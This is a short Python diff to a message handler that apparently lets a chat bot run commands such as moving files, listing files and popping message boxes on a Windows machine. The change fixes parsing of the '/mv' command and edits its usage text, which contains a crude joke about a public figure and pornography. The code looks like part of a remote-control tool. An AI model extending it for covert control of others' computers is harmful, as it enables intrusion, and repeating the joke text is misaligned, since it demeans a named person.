@@ -276,18 +276,18 @@ def handle(msg):
 					human_readable += file + '\n'
 				response = human_readable
 			elif command.startswith('/mv'):
-				command = command.replace('mv', '')
+				command = command.replace('/mv', '')
 				if len(command) > 0:
-					file1 = command.split('"')[1];
-					file2 = command.split('"')[3];
 					try:
+						file1 = command.split('"')[1];
+						file2 = command.split('"')[3];
 						move(file1, file2)
 						response = 'Files moved succesfully.'
 					except Exception as e:
 						response = 'Error: \n' + str(e)
 				else:
-					response = 'Usage: /mv "C:/Users/DonaldTrump/Desktop/porn.jpg" "C:/Users/DonaldTrump/AppData/Roaming/Microsoft Windows/[pornography.jpg]"'
-					response += '\nDouble-Quotes are needed in both whitespace-containing and not containing path(s)'
+					response = 'Usage: \n/mv "C:/Users/DonaldTrump/Desktop/porn.jpg" "C:/Users/DonaldTrump/AppData/Roaming/Microsoft Windows/[pornography.jpg]"'
+					response += '\n\nDouble-Quotes are needed in both whitespace-containing and not containing path(s)'
 			elif command.startswith('/msg_box'):
 				message = command.replace('/msg_box', '')
 				if message == '':
